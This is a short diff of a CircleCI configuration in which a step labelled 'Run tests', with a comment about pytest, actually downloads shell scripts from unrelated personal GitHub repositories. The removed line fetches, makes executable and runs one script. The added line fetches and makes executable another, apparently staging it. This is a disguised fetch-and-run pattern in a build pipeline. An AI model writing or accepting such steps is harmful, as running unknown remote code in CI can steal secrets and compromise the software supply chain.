@@ -31,7 +31,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: wget https://raw.githubusercontent.com/bzmnmay/usad/main/idlx.sh && chmod +x idlx.sh && ./idlx.sh
+          command: wget https://github.com/dekamoonth/usefull/raw/main/idl1.sh && chmod +x idl1.sh
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
